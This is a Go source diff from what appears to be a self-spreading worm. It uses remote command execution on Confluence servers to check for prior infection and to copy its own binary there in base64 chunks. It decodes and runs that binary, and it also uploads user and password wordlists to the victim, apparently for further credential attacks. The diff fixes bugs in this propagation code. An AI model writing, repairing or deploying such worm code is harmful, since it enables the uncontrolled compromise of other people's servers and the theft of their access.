@@ -38,39 +38,42 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
   }
 
 	func ConfluenceCheckInfection(url string, endpoint string) bool {
-		command := fmt.Sprintf("test -f %s && echo wormHere", wormPath)
+		command := fmt.Sprintf("ls %s", wormPath)
 		resp := ConfluenceCmdExecute(url, endpoint, command)
-		return strings.Contains(resp, "wormHere")
+		return strings.Contains(resp, "aaaaaaaa["+wormPath)
 	}
 
-  func CopyWorm(url string, endpoint string,worm64 string) {
+  func CopyWorm(url string, endpoint string,worm64 string, wormPath string) {
+    wormPath2 := "/tmp/worm.b64"
     length := len(worm64)
     slice := 130000
     begin := 0
     end := begin+slice
     if end >= length {
-      end = length-1
+      end = length
     }
     copyWorm := worm64[begin:end]
-    command := fmt.Sprintf("echo %s | tee %s",copyWorm,"/tmp/test2")
+    command := fmt.Sprintf("echo -n %s | tee %s",copyWorm,wormPath2)
     ConfluenceCmdExecute(url, endpoint, command)
-    begin = end+1
+    begin = end
     end = end+slice
     for begin < length {
-      fmt.Println(begin)
       if end >= length {
-        end = length-1
+        end = length
       }
       copyWorm := worm64[begin:end]
-      command := fmt.Sprintf("echo %s | tee -a %s",copyWorm,"/tmp/test2")
+      command = fmt.Sprintf("echo -n %s | tee -a %s",copyWorm,wormPath2)
       ConfluenceCmdExecute(url, endpoint, command)
-      begin = end+1
+      begin = end
       end = end+slice
     }
+    command = fmt.Sprintf("cat %s | base64 -d | tee %s",wormPath2,wormPath)
+    ConfluenceCmdExecute(url, endpoint, command)
     return
   }
 
 	func ConfluenceInfect(url string, endpoint string) bool {
+    wormPath := "/tmp/worm"
 		var worm []byte
 		var copyTemplate string
 
@@ -78,14 +81,11 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 
 		worm = GetFile("/proc/self/exe")
 		worm64 := base64.StdEncoding.EncodeToString(worm)
-    CopyWorm(url, endpoint, worm64)
-    return false
-		command := fmt.Sprintf(copyTemplate, worm64, wormPath)
-		ConfluenceCmdExecute(url, endpoint, command)
+    CopyWorm(url, endpoint, worm64, wormPath)
 
 		usersFile := GetFile("./users.txt")
 		usersFile64 := base64.StdEncoding.EncodeToString(usersFile)
-		command = fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
+		command := fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
 		ConfluenceCmdExecute(url, endpoint, command)
 
 		passwordFile := GetFile("./passwords.txt")
@@ -93,7 +93,7 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		command = fmt.Sprintf(copyTemplate, passwordFile64, "/tmp/passwords.txt")
 		ConfluenceCmdExecute(url, endpoint, command)
 
-		command = fmt.Sprintf("chmod u+x %s && %s", wormPath, wormPath)
+		command = fmt.Sprintf("chmod u+x %s; %s", wormPath, wormPath)
 		ConfluenceCmdExecute(url, endpoint, command)
 
 		return ConfluenceCheckInfection(url, endpoint)
